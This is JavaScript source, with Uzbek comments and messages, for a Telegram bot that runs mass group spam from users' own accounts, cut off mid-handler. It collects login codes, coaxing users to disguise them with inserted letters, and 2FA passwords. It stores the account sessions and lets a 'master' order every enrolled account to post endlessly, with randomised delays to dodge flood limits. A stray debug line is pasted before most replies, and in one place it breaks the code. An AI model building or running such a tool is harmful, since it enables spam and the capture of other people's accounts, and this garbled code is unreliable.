/**
 * BROADCAST BOT - Guruxlarga avtomatik xabar tarqatish
 * Telefon raqam bilan ro'yxatdan o'tish
 *
 * v3.0 - Master/Tobe tizimi + Ikki rejim:
 * 1. Oddiy rejim: 0.3-6 sek delay, 5 daq pauza
 * 2. 100% Himoyalangan: 1-15 sek delay, 10 daq pauza, qat'iy filter
 * 3. Master - session ulamaydi, faqat buyruq beradi
 * 4. Tobe - session ulangan, master xabarini tarqatadi
 */

require('dotenv').config();
const { Telegraf, Markup } = require('telegraf');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const low = require('lowdb');
const FileSync = require('lowdb/adapters/FileSync');
const path = require('path');

// Database
const adapter = new FileSync(path.join(__dirname, 'db.json'));
const db = low(adapter);

db.defaults({ users: [], broadcasts: [] }).write();

// Bot
const bot = new Telegraf(process.env.BOT_TOKEN);

// API credentials
const API_ID = parseInt(process.env.TELEGRAM_API_ID);
const API_HASH = process.env.TELEGRAM_API_HASH;

// Storage
const userClients = new Map();
const userStates = new Map();
const activeBroadcasts = new Map();  // slaveId -> broadcastId (unique for each broadcast)
const authResolvers = new Map();
const pendingAuths = new Map();
const blockedGroups = new Map();

// Unikal broadcast ID generatsiya
function generateBroadcastId() {
  return Date.now().toString(36) + Math.random().toString(36).substring(2, 8);
}

// =============== HELPERS ===============

// Oddiy rejim: 0.3-6 sekund (o'zi yuborsa)
function getRandomDelay() {
  const minDelay = 300;   // 0.3 sekund
  const maxDelay = 6000;  // 6 sekund
  return Math.floor(Math.random() * (maxDelay - minDelay)) + minDelay;
}

// 100% Himoyalangan rejim: 1-15 sekund
function getSafeDelay() {
  const minDelay = 1000;   // 1 sekund
  const maxDelay = 15000;  // 15 sekund
  return Math.floor(Math.random() * (maxDelay - minDelay)) + minDelay;
}

// Tobe tez rejim: 0.1-2 sekund (master buyrug'i bilan)
function getSlaveDelay() {
  const minDelay = 100;   // 0.1 sekund
  const maxDelay = 2000;  // 2 sekund
  return Math.floor(Math.random() * (maxDelay - minDelay)) + minDelay;
}

// Tobe xavfsiz rejim: 0.5-5 sekund
function getSlaveSafeDelay() {
  const minDelay = 500;   // 0.5 sekund
  const maxDelay = 5000;  // 5 sekund
  return Math.floor(Math.random() * (maxDelay - minDelay)) + minDelay;
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function truncateName(name, max = 15) {
  if (!name) return '';
  return name.length > max ? name.substring(0, max) + '...' : name;
}

function sanitizeName(name) {
  if (!name) return 'Guruh';
  return name
    .replace(/[^\w\s\-.,!?()а-яА-ЯёЁa-zA-Z0-9]/g, '')
    .substring(0, 30)
    .trim() || 'Guruh';
}

// Referal kod generatsiya
function generateRefCode() {
  return Math.random().toString(36).substring(2, 10).toUpperCase();
}

// Master uchun tobe'larni olish
function getSlaves(masterId) {
  return db.get('users').filter({ masterId: masterId.toString() }).value() || [];
}

// Master xabarini barcha tobe'larga tarqatish
async function masterBroadcast(masterId, message, ctx, safeMode = false) {
  const slaves = getSlaves(masterId);

  if (slaves.length === 0) {
    console.log('Sending 2FA prompt...');
          await ctx.reply('❌ Sizga ulangan tobe akkauntlar yo\'q!\n\n📎 Referal havolangizni ulashing.');
    return;
  }

  // Tayyor tobe'lar (session va guruh bor)
  const readySlaves = slaves.filter(s => s.sessionString && s.selectedGroups?.length > 0);

  if (readySlaves.length === 0) {
    console.log('Sending 2FA prompt...');
          await ctx.reply(
      `❌ Tayyor tobe akkauntlar yo'q!\n\n` +
      `📊 Jami tobe'lar: ${slaves.length} ta\n` +
      `⚠️ Tobe'lar session ulashi va guruhlar tanlashi kerak.`
    );
    return;
  }

  const modeLabel = safeMode ? '🛡️ HIMOYALANGAN' : '🚀 ODDIY';
  const totalGroups = readySlaves.reduce((sum, s) => sum + (s.selectedGroups?.length || 0), 0);

  console.log('Sending 2FA prompt...');
          await ctx.reply(
    `👑 <b>MASTER BROADCAST ${modeLabel}</b>\n\n` +
    `👥 Tayyor tobe'lar: ${readySlaves.length}/${slaves.length}\n` +
    `📋 Jami guruhlar: ${totalGroups} ta\n` +
    `📝 Xabar: ${message.substring(0, 50)}...\n\n` +
    `⏳ Tarqatish boshlanmoqda...`,
    { parse_mode: 'HTML' }
  );

  // Har bir tobe uchun xabarni saqlash va broadcast boshlash
  const results = [];

  for (const slave of readySlaves) {
    const slaveId = parseInt(slave.id);

    // Tobe'ning xabarini yangilash
    db.get('users').find({ id: slave.id }).assign({ broadcastMessage: message }).write();

    // Tobe'ga xabar yuborish
    try {
      await ctx.telegram.sendMessage(
        slaveId,
        `👑 <b>Master buyrug'i!</b>\n\n` +
        `📝 Yangi xabar: ${message.substring(0, 100)}...\n\n` +
        `🚀 Tarqatish avtomatik boshlandi (${modeLabel})`,
        { parse_mode: 'HTML' }
      );

      // Yangi broadcast boshlash (eski avtomatik to'xtaydi)
      startSlaveBroadcast(slaveId, message, safeMode).then(result => {
        results.push({ slaveId, ...result });
      });
    } catch (err) {
      console.log(`[MASTER] Could not notify slave ${slaveId}: ${err.message}`);
    }
  }

  // Master uchun jarayon boshlandi xabari
  console.log('Sending 2FA prompt...');
          await ctx.reply(
    `✅ <b>Tarqatish boshlandi!</b>\n\n` +
    `👥 ${readySlaves.length} ta tobe'ga buyruq yuborildi\n` +
    `📊 Hisobot tayyor bo'lganda xabar keladi`,
    { parse_mode: 'HTML' }
  );
}

// Tobe uchun broadcast (master buyrug'i bilan) - CHEKSIZ RAUND
async function startSlaveBroadcast(slaveId, message, safeMode) {
  // Global bot.telegram ishlatamiz - har doim yangi va ishchi
  const telegram = bot.telegram;
  const user = db.get('users').find({ id: slaveId.toString() }).value();
  if (!user?.sessionString || !user?.selectedGroups?.length) {
    return { success: false, error: 'not_ready' };
  }

  let client = userClients.get(slaveId);
  if (!client) {
    const restored = await restoreSession(slaveId);
    if (restored) {
      client = userClients.get(slaveId);
    } else {
      return { success: false, error: 'session_failed' };
    }
  }

  const modeLabel = safeMode ? '🛡️' : '🚀';
  const pauseMinutes = safeMode ? 10 : 5;

  // Unikal broadcast ID - yangi broadcast boshlanganida eski to'xtaydi
  const broadcastId = generateBroadcastId();
  activeBroadcasts.set(slaveId, broadcastId);
  let roundCount = 0;
  let totalSent = 0, totalFailed = 0;

  console.log(`[SLAVE ${slaveId}] Starting broadcast ${broadcastId} (${modeLabel})`);

  // Funksiya: bu broadcast hali faolmi?
  const isActive = () => activeBroadcasts.get(slaveId) === broadcastId;

  try {
    // CHEKSIZ LOOP - master to'xtatguncha yoki yangi broadcast boshlanguncha
    while (isActive()) {
      roundCount++;
      let sent = 0, failed = 0;
      const roundStartTime = Date.now();

      console.log(`[SLAVE ${slaveId}] Round ${roundCount} starting`);

      const userBlocked = blockedGroups.get(slaveId) || new Set();
      const groupsToSend = user.selectedGroups.filter(id => !userBlocked.has(id));

      for (const groupId of groupsToSend) {
        if (!isActive()) break;

        try {
          await client.sendMessage(groupId, { message });
          sent++;
          console.log(`[SLAVE ${slaveId}] Sent to ${groupId}`);
        } catch (err) {
          const errMsg = err.message || '';
          console.log(`[SLAVE ${slaveId}] Failed to ${groupId}: ${errMsg}`);

          if (errMsg.includes('CHAT_WRITE_FORBIDDEN') ||
              errMsg.includes('USER_BANNED') ||
              errMsg.includes('CHANNEL_PRIVATE')) {
            userBlocked.add(groupId);
            blockedGroups.set(slaveId, userBlocked);
          }
          failed++;
        }

        // Tobe oddiy rejimda: 0.3-6 sek, xavfsiz: 1-15 sek
        await sleep(safeMode ? getSafeDelay() : getRandomDelay());
      }

      const duration = Math.round((Date.now() - roundStartTime) / 1000);
      totalSent += sent;
      totalFailed += failed;

      console.log(`[SLAVE ${slaveId}] Round ${roundCount} done: sent=${sent}, failed=${failed}`);

      // Masterga har raund hisoboti - yangi user data olish
      const freshUser = db.get('users').find({ id: slaveId.toString() }).value();
      const masterId = freshUser?.masterId;

      if (masterId) {
        try {
          const masterIdNum = parseInt(masterId);
          console.log(`[SLAVE ${slaveId}] Sending report to master ID: ${masterIdNum}`);
          await telegram.sendMessage(
            masterIdNum,
            `📊 <b>Tobe ${roundCount}-raund</b>\n\n` +
            `👤 ${freshUser.telegramName || freshUser.phone || slaveId}\n` +
            `📤 Yuborildi: ${sent}\n` +
            `❌ Xato: ${failed}\n` +
            `⏱ ${duration} sek\n` +
            `⏳ Keyingi: ${pauseMinutes} daq`,
            { parse_mode: 'HTML' }
          );
          console.log(`[SLAVE ${slaveId}] ✅ Report sent to master ${masterIdNum}`);
        } catch (e) {
          console.log(`[SLAVE ${slaveId}] ❌ Failed to send report to master: ${e.message}`);
        }
      } else {
        console.log(`[SLAVE ${slaveId}] ⚠️ No masterId found in DB!`);
      }

      if (!isActive()) break;

      // PAUZA
      console.log(`[SLAVE ${slaveId}] ${pauseMinutes} minute pause`);
      for (let i = pauseMinutes; i >= 1; i--) {
        if (!isActive()) break;
        await sleep(60000);
      }
    }
  } catch (error) {
    console.log(`[SLAVE ${slaveId}] Error: ${error.message}`);
  }

  // Faqat o'zimiz hali faol bo'lsak, tozalaymiz
  if (isActive()) {
    activeBroadcasts.delete(slaveId);
  }
  console.log(`[SLAVE ${slaveId}] Broadcast ${broadcastId} stopped after ${roundCount} rounds`);

  // Yakuniy hisobot masterga - yangi user data olish
  const finalUser = db.get('users').find({ id: slaveId.toString() }).value();
  if (finalUser?.masterId) {
    try {
      const masterIdNum = parseInt(finalUser.masterId);
      await telegram.sendMessage(
        masterIdNum,
        `🛑 <b>Tobe to'xtadi</b>\n\n` +
        `👤 ${finalUser.telegramName || finalUser.phone || slaveId}\n` +
        `📊 Jami: ${roundCount} raund\n` +
        `📤 Yuborildi: ${totalSent}\n` +
        `❌ Xato: ${totalFailed}`,
        { parse_mode: 'HTML' }
      );
      console.log(`[SLAVE ${slaveId}] Final report sent to master ${masterIdNum}`);
    } catch (e) {
      console.log(`[SLAVE ${slaveId}] Failed to send final report: ${e.message}`);
    }
  }

  return { success: true, rounds: roundCount, sent: totalSent, failed: totalFailed };
}

// =============== AUTHENTICATION ===============

async function startAuth(userId, phoneNumber, ctx) {
  const existingAuth = pendingAuths.get(userId);
  if (existingAuth) {
    existingAuth.cancelled = true;
    try { await existingAuth.client?.disconnect(); } catch (e) {}
    console.log(`Cancelled existing auth for user ${userId}`);
  }

  const authState = { cancelled: false, client: null, codeEntered: false };
  pendingAuths.set(userId, authState);

  return new Promise(async (resolve) => {
    let client = null;
    let timeoutId = null;

    const cleanup = async () => {
      if (timeoutId) clearTimeout(timeoutId);
      authResolvers.delete(userId);
      userStates.delete(userId);
      pendingAuths.delete(userId);
      if (client) {
        try { await client.disconnect(); } catch (e) {}
      }
    };

    try {
      client = new TelegramClient(
        new StringSession(''),
        API_ID,
        API_HASH,
        { connectionRetries: 3, useWSS: false, timeout: 30 }
      );
      authState.client = client;

      await client.connect();
      console.log(`Connected for user ${userId}`);

      if (authState.cancelled) {
        await cleanup();
        resolve({ success: false, error: 'cancelled' });
        return;
      }

      const sendCodeResult = await client.invoke(
        new (require('telegram/tl').Api.auth.SendCode)({
          phoneNumber: phoneNumber,
          apiId: API_ID,
          apiHash: API_HASH,
          settings: new (require('telegram/tl').Api.CodeSettings)({})
        })
      );

      console.log('Code sent, phoneCodeHash:', sendCodeResult.phoneCodeHash);
      authState.phoneCodeHash = sendCodeResult.phoneCodeHash;
      userStates.set(userId, { step: 'waiting_code', phone: phoneNumber });

      console.log('Sending 2FA prompt...');
          await ctx.reply(
        '✅ <b>Kod yuborildi!</b>\n\n' +
        '📱 Telegramga kelgan kodning <b>raqamlari orasiga harf qo\'shing</b>:\n\n' +
        '💡 <b>Masalan:</b>\n' +
        '• Kod <code>12345</code> → yozing: <code>1a2a3a4a5</code>\n\n' +
        '⏱ <i>5 daqiqa ichida kiriting</i>',
        { parse_mode: 'HTML' }
      );

      const code = await new Promise((res, rej) => {
        authResolvers.set(userId, { resolveCode: res, resolvePassword: null, reject: rej });
        timeoutId = setTimeout(() => rej(new Error('TIMEOUT')), 5 * 60 * 1000);
      });

      console.log('Code received from user');
      authState.codeEntered = true;

      try {
        await client.invoke(
          new (require('telegram/tl').Api.auth.SignIn)({
            phoneNumber: phoneNumber,
            phoneCodeHash: authState.phoneCodeHash,
            phoneCode: code
          })
        );

        const me = await client.getMe();
        const sessionString = client.session.save();

        db.get('users')
          .find({ id: userId.toString() })
          .assign({
            sessionString,
            phone: phoneNumber,
            telegramName: `${me.firstName || ''} ${me.lastName || ''}`.trim(),
            sessionConnected: true,
            connectedAt: new Date().toISOString()
          })
          .write();

        userClients.set(userId, client);
        userStates.delete(userId);
        authResolvers.delete(userId);
        pendingAuths.delete(userId);

        resolve({
          success: true,
          name: `${me.firstName || ''} ${me.lastName || ''}`.trim(),
          phone: phoneNumber
        });

      } catch (signInError) {
        console.error("SignIn error:", signInError.message);
        console.log("Checking for 2FA...", signInError.message?.includes("SESSION_PASSWORD_NEEDED"));

        if (signInError.message?.includes('SESSION_PASSWORD_NEEDED')) {
          userStates.set(userId, { step: 'waiting_2fa', phone: phoneNumber });

          console.log('Sending 2FA prompt...');
          await ctx.reply(
            '🔐 <b>2FA parol kerak</b>\n\nTelegram parolingizni yuboring:',
            { parse_mode: 'HTML' }
          );

          const password = await new Promise((res, rej) => {
            authResolvers.set(userId, { resolveCode: null, resolvePassword: res, reject: rej });
            timeoutId = setTimeout(() => rej(new Error('TIMEOUT')), 5 * 60 * 1000);
          });

          const passwordInfo = await client.invoke(
            new (require('telegram/tl').Api.account.GetPassword)()
          );
          const srpPassword = await require('telegram/Password').computeCheck(passwordInfo, password);
          await client.invoke(
            new (require('telegram/tl').Api.auth.CheckPassword)({ password: srpPassword })
          );

          const me = await client.getMe();
          const sessionString = client.session.save();

          db.get('users')
            .find({ id: userId.toString() })
            .assign({
              sessionString,
              phone: phoneNumber,
              telegramName: `${me.firstName || ''} ${me.lastName || ''}`.trim(),
              sessionConnected: true,
              connectedAt: new Date().toISOString()
            })
            .write();

          userClients.set(userId, client);
          await cleanup();

          resolve({
            success: true,
            name: `${me.firstName || ''} ${me.lastName || ''}`.trim(),
            phone: phoneNumber
          });
        } else {
          await cleanup();
          resolve({ success: false, error: signInError.message });
        }
      }

    } catch (error) {
      console.error('Auth error:', error.message);
      await cleanup();

      if (error.message === 'TIMEOUT') {
        console.log('Sending 2FA prompt...');
          await ctx.reply('⏱ Vaqt tugadi. Qayta urinib ko\'ring.');
        resolve({ success: false, error: 'timeout', silent: true });
        return;
      }

      resolve({ success: false, error: error.message });
    }
  });
}

async function restoreSession(userId) {
  const user = db.get('users').find({ id: userId.toString() }).value();
  if (!user?.sessionString) return false;

  try {
    const client = new TelegramClient(
      new StringSession(user.sessionString),
      API_ID,
      API_HASH,
      { connectionRetries: 5 }
    );

    await client.connect();

    if (await client.isUserAuthorized()) {
      userClients.set(userId, client);
      console.log(`✅ Session restored for user ${userId}`);
      return true;
    }
  } catch (error) {
    console.error('Restore session error:', error.message);
  }
  return false;
}

// =============== GET GROUPS ===============

async function getGroups(userId) {
  console.log(`[GROUPS] Getting groups for user ${userId}`);
  let client = userClients.get(userId);

  if (!client) {
    console.log(`[GROUPS] No client, restoring session...`);
    const restored = await restoreSession(userId);
    if (restored) {
      client = userClients.get(userId);
    } else {
      console.log(`[GROUPS] Could not restore session`);
      return [];
    }
  }

  try {
    console.log(`[GROUPS] Fetching dialogs...`);
    const dialogs = await client.getDialogs({ limit: 200 });
    console.log(`[GROUPS] Got ${dialogs.length} dialogs`);

    const groups = dialogs
      .filter(d => d.isGroup || d.isChannel)
      .map(d => ({
        id: d.id.toString(),
        title: sanitizeName(d.title),
        isChannel: d.isChannel,
        isGroup: d.isGroup,
        participantsCount: d.entity?.participantsCount || 0
      }));

    groups.sort((a, b) => b.participantsCount - a.participantsCount);

    console.log(`[GROUPS] Filtered to ${groups.length} groups/channels, sorted by members`);
    return groups;
  } catch (error) {
    console.error('[GROUPS] Error:', error.message);
    return [];
  }
}

// =============== BROADCAST ===============

async function startBroadcast(userId, ctx, safeMode = false) {
  const modeLabel = safeMode ? '🛡️ HIMOYALANGAN' : '🚀 ODDIY';
  const delayRange = safeMode ? '1-15 sek' : '0.3-6 sek';
  const pauseMinutes = safeMode ? 10 : 5;

  console.log(`[BROADCAST] Starting ${modeLabel} mode for user ${userId}`);

  const user = db.get('users').find({ id: userId.toString() }).value();

  if (!user?.selectedGroups?.length) {
    console.log('Sending 2FA prompt...');
          await ctx.reply('❌ Guruhlar tanlanmagan! "📋 Guruhlar" bosing');
    return;
  }

  if (!user?.broadcastMessage) {
    console.log('Sending 2FA prompt...');
          await ctx.reply('❌ Xabar yozilmagan! "📝 Xabar yozish" bosing');
    return;
  }

  let client = userClients.get(userId);

  if (!client) {
    console.log(`[BROADCAST] No client, trying to restore session`);
    const restored = await restoreSession(userId);
    if (restored) {
      client = userClients.get(userId);
    } else {
      console.log('Sending 2FA prompt...');
          await ctx.reply('❌ Session ulanmagan! "📱 Ro\'yxatdan o\'tish" bosing');
      return;
    }
  }

  try {
    const connected = await client.isUserAuthorized();
    if (!connected) {
      console.log(`[BROADCAST] Client not authorized`);
      console.log('Sending 2FA prompt...');
          await ctx.reply('❌ Session muddati tugagan! Qayta ulaning.');
      return;
    }
  } catch (e) {
    console.log(`[BROADCAST] Client check error: ${e.message}`);
    console.log('Sending 2FA prompt...');
          await ctx.reply('❌ Session xatosi! Qayta ulaning.');
    return;
  }

  if (activeBroadcasts.get(userId)) {
    console.log('Sending 2FA prompt...');
          await ctx.reply('⚠️ Tarqatish allaqachon ishlayapti!');
    return;
  }

  activeBroadcasts.set(userId, true);
  let roundCount = 0;

  if (safeMode) {
    console.log('Sending 2FA prompt...');
          await ctx.reply(
      `🛡️ <b>100% HIMOYALANGAN REJIM</b>\n\n` +
      `📋 Guruhlar: ${user.selectedGroups.length} ta\n` +
      `📝 Xabar: ${user.broadcastMessage.substring(0, 50)}...\n\n` +
      `⚙️ <b>Sozlamalar:</b>\n` +
      `├ Delay: 1-15 sekund\n` +
      `├ Pauza: 10 daqiqa\n` +
      `├ Flood wait >10 daq: ⏭ skip\n` +
      `└ Cheklangan guruhlar: ⏭ skip\n\n` +
      `✅ 24 soatlik reklama uchun xavfsiz!\n` +
      `🛑 To'xtatish uchun: 🛑 To'xtatish`,
      { parse_mode: 'HTML' }
    );
  } else {
    console.log('Sending 2FA prompt...');
          await ctx.reply(
      `🚀 <b>Tarqatish boshlandi!</b>\n\n` +
      `📋 Guruhlar: ${user.selectedGroups.length} ta\n` +
      `📝 Xabar: ${user.broadcastMessage.substring(0, 50)}...\n\n` +
      `⏱ Raundlar orasida: 5 daqiqa\n` +
      `🔄 To'xtatish uchun: 🛑 To'xtatish`,
      { parse_mode: 'HTML' }
    );
  }

  try {
    // CHEKSIZ LOOP - faqat to'xtatish buyrug'i bilan to'xtaydi
    while (activeBroadcasts.get(userId)) {
      roundCount++;
      console.log(`[BROADCAST] Round ${roundCount} starting (${modeLabel}, delay: ${delayRange})`);
      let sent = 0, failed = 0, skipped = 0;
      const totalGroups = user.selectedGroups.length;
      const roundStartTime = Date.now();

      const statusMsg = console.log('Sending 2FA prompt...');
          await ctx.reply(
        `🔄 <b>${roundCount}-raund</b> ${safeMode ? '🛡️' : ''}\n\n` +
        `📤 Yuborilmoqda: 0/${totalGroups}`,
        { parse_mode: 'HTML' }
      );

      const userBlocked = blockedGroups.get(userId) || new Set();
      const availableGroups = user.availableGroups || [];
      let replacedCount = 0;

      const activeGroups = user.selectedGroups.filter(id => !userBlocked.has(id));
      const extraGroups = availableGroups
        .filter(g => !user.selectedGroups.includes(g.id) && !userBlocked.has(g.id))
        .slice(0, user.selectedGroups.length - activeGroups.length)
        .map(g => g.id);

      const groupsToSend = [...activeGroups, ...extraGroups];
      replacedCount = extraGroups.length;

      for (const groupId of groupsToSend) {
        if (!activeBroadcasts.get(userId)) break;

        if (userBlocked.has(groupId)) continue;

        try {
          await client.sendMessage(groupId, { message: user.broadcastMessage });
          sent++;
          console.log(`[BROADCAST] Sent to ${groupId}`);
        } catch (err) {
          const errMsg = err.message || '';
          console.log(`[BROADCAST] Failed to ${groupId}: ${errMsg}`);

          // Flood wait tekshirish
          if (errMsg.includes('wait of') || errMsg.includes('FLOOD')) {
            const waitMatch = errMsg.match(/wait of (\d+)/);
            const waitSeconds = waitMatch ? parseInt(waitMatch[1]) : 0;

            // Safe rejimda 10 daqiqadan (600 sek) oshiq bo'lsa bloklash
            // Oddiy rejimda 5 daqiqadan (300 sek) oshiq bo'lsa bloklash
            const maxWait = safeMode ? 600 : 300;

            if (waitSeconds > maxWait) {
              userBlocked.add(groupId);
              blockedGroups.set(userId, userBlocked);
              console.log(`[BROADCAST] Blocked ${groupId} - flood wait ${waitSeconds}s > ${maxWait}s`);
            } else if (safeMode) {
              // Safe rejimda har qanday flood wait ni skip qilish
              skipped++;
              console.log(`[BROADCAST] Skipped ${groupId} - flood wait ${waitSeconds}s (safe mode)`);
              continue;
            }
          } else if (
            errMsg.includes('CHAT_WRITE_FORBIDDEN') ||
            errMsg.includes('USER_BANNED') ||
            errMsg.includes('CHANNEL_PRIVATE') ||
            errMsg.includes('CHAT_ADMIN_REQUIRED') ||
            errMsg.includes('need to add') ||
            errMsg.includes('odam') ||
            errMsg.includes('member') ||
            errMsg.includes('ADD_USER') ||
            errMsg.includes('INVITE')
          ) {
            userBlocked.add(groupId);
            blockedGroups.set(userId, userBlocked);
            console.log(`[BROADCAST] Blocked ${groupId} - write forbidden/restricted`);
          }

          failed++;
        }

        if ((sent + failed + skipped) % 3 === 0 || (sent + failed + skipped) === groupsToSend.length) {
          try {
            await ctx.telegram.editMessageText(
              ctx.chat.id,
              statusMsg.message_id,
              null,
              `🔄 <b>${roundCount}-raund</b> ${safeMode ? '🛡️' : ''}\n\n` +
              `📤 Yuborildi: <b>${sent}</b> ta\n` +
              `❌ Xato: ${failed}\n` +
              (safeMode ? `⏭ O'tkazildi: ${skipped}\n` : '') +
              `📊 Progress: ${sent + failed + skipped}/${groupsToSend.length}`,
              { parse_mode: 'HTML' }
            );
          } catch (e) {}
        }

        // Delay - rejimga qarab
        await sleep(safeMode ? getSafeDelay() : getRandomDelay());
      }

      const roundDuration = Math.round((Date.now() - roundStartTime) / 1000);
      const minutes = Math.floor(roundDuration / 60);
      const seconds = roundDuration % 60;
      const durationStr = minutes > 0 ? `${minutes} daqiqa ${seconds} soniya` : `${seconds} soniya`;

      console.log(`[BROADCAST] Round ${roundCount} done: sent=${sent}, failed=${failed}, skipped=${skipped}, duration=${roundDuration}s`);

      const nextRoundTime = new Date(Date.now() + pauseMinutes * 60 * 1000);
      const timeStr = nextRoundTime.toLocaleTimeString('uz-UZ', { hour: '2-digit', minute: '2-digit' });

      try {
        await ctx.telegram.editMessageText(
          ctx.chat.id,
          statusMsg.message_id,
          null,
          `✅ <b>${roundCount}-raund tugadi</b> ${safeMode ? '🛡️' : ''}\n\n` +
          `📤 Yuborildi: <b>${sent}</b> ta\n` +
          `❌ Xato: ${failed}\n` +
          (safeMode ? `⏭ O'tkazildi: ${skipped}\n` : '') +
          `⏱ Davomiyligi: ${durationStr}\n\n` +
          `⏳ Keyingi raund: <b>${timeStr}</b> (${pauseMinutes} daqiqa)`,
          { parse_mode: 'HTML' }
        );
      } catch (e) {}

      if (!activeBroadcasts.get(userId)) break;

      // PAUZA - rejimga qarab
      console.log(`[BROADCAST] ${pauseMinutes} minute pause starting`);
      for (let i = pauseMinutes; i >= 1; i--) {
        if (!activeBroadcasts.get(userId)) {
          console.log(`[BROADCAST] Stopped during pause`);
          break;
        }
        console.log(`[BROADCAST] ${i} minutes remaining`);
        await sleep(60000);
      }
      console.log(`[BROADCAST] Pause done, starting next round`);
    }
  } catch (error) {
    console.error(`[BROADCAST] Error: ${error.message}`);
    console.log('Sending 2FA prompt...');
          await ctx.reply(`❌ Xatolik: ${error.message}`);
  }

  activeBroadcasts.set(userId, false);
  console.log('Sending 2FA prompt...');
          await ctx.reply(
    `🛑 Tarqatish to'xtatildi ${safeMode ? '🛡️' : ''}\n\n` +
    `📊 Jami: ${roundCount} ta raund bajarildi`
  );
}

// =============== BOT HANDLERS ===============

bot.start(async (ctx) => {
  const userId = ctx.from.id;
  const startPayload = ctx.startPayload; // ref_MASTERID

  let user = db.get('users').find({ id: userId.toString() }).value();

  // Referal orqali kelgan - tobe sifatida ulash
  if (startPayload && startPayload.startsWith('ref_')) {
    const masterRefCode = startPayload.replace('ref_', '');
    const master = db.get('users').find({ refCode: masterRefCode }).value();

    if (master && master.isMaster) {
      if (!user) {
        // Yangi user - tobe sifatida yaratish
        db.get('users').push({
          id: userId.toString(),
          name: truncateName(`${ctx.from.first_name || ''} ${ctx.from.last_name || ''}`),
          username: ctx.from.username,
          sessionConnected: false,
          selectedGroups: [],
          broadcastMessage: null,
          isMaster: false,
          masterId: master.id,
          createdAt: new Date().toISOString()
        }).write();

        console.log('Sending 2FA prompt...');
          await ctx.reply(
          `✅ <b>Siz tobe sifatida ulangingiz!</b>\n\n` +
          `👑 Master: ${master.name || 'Anonim'}\n\n` +
          `<b>Endi qilishingiz kerak:</b>\n` +
          `1️⃣ Session ulang (📱 Ro'yxatdan o'tish)\n` +
          `2️⃣ Guruhlarni tanlang (📋 Guruhlar)\n\n` +
          `Master xabar yuborganda avtomatik tarqatiladi!`,
          { parse_mode: 'HTML' }
        );
      } else if (!user.masterId || user.masterId !== master.id) {
        // Mavjud user - masterga ulash yoki yangi masterga o'tish
        const oldMasterId = user.masterId;

        db.get('users').find({ id: userId.toString() }).assign({
          masterId: master.id,
          isMaster: false
        }).write();

        if (oldMasterId && oldMasterId !== master.id) {
          console.log('Sending 2FA prompt...');
          await ctx.reply(
            `✅ <b>Master o'zgartirildi!</b>\n\n` +
            `👑 Yangi master: ${master.name || 'Anonim'}`,
            { parse_mode: 'HTML' }
          );
        } else {
          console.log('Sending 2FA prompt...');
          await ctx.reply(
            `✅ <b>Siz tobe sifatida ulangingiz!</b>\n\n` +
            `👑 Master: ${master.name || 'Anonim'}`,
            { parse_mode: 'HTML' }
          );
        }
      } else {
        console.log('Sending 2FA prompt...');
          await ctx.reply(`✅ Siz allaqachon bu masterga ulangansiz!`);
      }

      user = db.get('users').find({ id: userId.toString() }).value();
    } else {
      console.log('Sending 2FA prompt...');
          await ctx.reply('❌ Noto\'g\'ri referal havola!');
    }
  }

  // User mavjud bo'lmasa yaratish
  if (!user) {
    db.get('users').push({
      id: userId.toString(),
      name: truncateName(`${ctx.from.first_name || ''} ${ctx.from.last_name || ''}`),
      username: ctx.from.username,
      sessionConnected: false,
      selectedGroups: [],
      broadcastMessage: null,
      isMaster: false,
      masterId: null,
      createdAt: new Date().toISOString()
    }).write();
    user = db.get('users').find({ id: userId.toString() }).value();
  }

  if (user.sessionString && !userClients.has(userId)) {
    await restoreSession(userId);
  }

  const isConnected = userClients.has(userId);
  const isMaster = user.isMaster;
  const slaves = isMaster ? getSlaves(userId) : [];
  const readySlaves = slaves.filter(s => s.sessionString && s.selectedGroups?.length > 0);

  // Master uchun keyboard
  if (isMaster) {
    const botInfo = await ctx.telegram.getMe();
    const refLink = `https://t.me/${botInfo.username}?start=ref_${user.refCode}`;
    const masterHasSession = user.sessionString ? '✅' : '❌';
    const masterGroups = user.selectedGroups?.length || 0;

    console.log('Sending 2FA prompt...');
          await ctx.reply(
      `👑 <b>MASTER PANEL v3.0</b>\n\n` +
      `📎 Referal: <code>${refLink}</code>\n\n` +
      `<b>Sizning akkauntingiz:</b>\n` +
      `├ Session: ${masterHasSession}\n` +
      `└ Guruhlar: ${masterGroups} ta\n\n` +
      `<b>Tobe'laringiz:</b>\n` +
      `├ Tayyor: ${readySlaves.length}/${slaves.length}\n` +
      `└ Guruhlar: ${readySlaves.reduce((s, u) => s + (u.selectedGroups?.length || 0), 0)} ta\n\n` +
      `<b>Tarqatish usullari:</b>\n` +
      `📤 O'zimdan - o'z akkauntingizdan\n` +
      `👥 Tobe'lardan - faqat tobe'lar orqali`,
      {
        parse_mode: 'HTML',
        ...Markup.keyboard([
          ['📱 Session ulash', '📋 Guruhlarim'],
          ['📝 Xabar yozish'],
          ['📤 O\'zimdan', '👥 Tobe\'lardan'],
          ['🛡️ O\'zimdan (xavfsiz)', '🛡️ Tobe\'lar (xavfsiz)'],
          ['👥 Tobe\'lar ro\'yxati', '📊 Hisobot'],
          ['🛑 Hammani to\'xtatish', 'ℹ️ Status']
        ]).resize()
      }
    );
    return;
  }

  // Tobe yoki oddiy user uchun keyboard
  const masterInfo = user.masterId
    ? `\n👑 Master: #${user.masterId.substring(0, 6)}...`
    : '';

  console.log('Sending 2FA prompt...');
          await ctx.reply(
    `🤖 <b>BROADCAST BOT v3.0</b>\n\n` +
    `${isConnected ? '✅ Ulangan: ' + (user.phone || '') : '❌ Ulanmagan'}` +
    `${masterInfo}\n\n` +
    `<b>Rejimlar:</b>\n` +
    `🚀 Oddiy - tez tarqatish (0.3-6 sek)\n` +
    `🛡️ Himoyalangan - 24 soatlik xavfsiz (1-15 sek)\n\n` +
    `<b>Qadamlar:</b>\n` +
    `1️⃣ Ro'yxatdan o'ting\n` +
    `2️⃣ Guruhlarni tanlang\n` +
    `3️⃣ Xabar yozing\n` +
    `4️⃣ Rejimni tanlang`,
    {
      parse_mode: 'HTML',
      ...Markup.keyboard([
        ['📱 Ro\'yxatdan o\'tish', '👑 Master bo\'lish'],
        ['📋 Guruhlar', '📝 Xabar yozish'],
        ['🚀 Boshlash', '🛡️ 100% Himoyalangan'],
        ['🛑 To\'xtatish', 'ℹ️ Status']
      ]).resize()
    }
  );
});

// ============== MASTER HANDLERS ==============

// 👑 Master bo'lish
bot.hears('👑 Master bo\'lish', async (ctx) => {
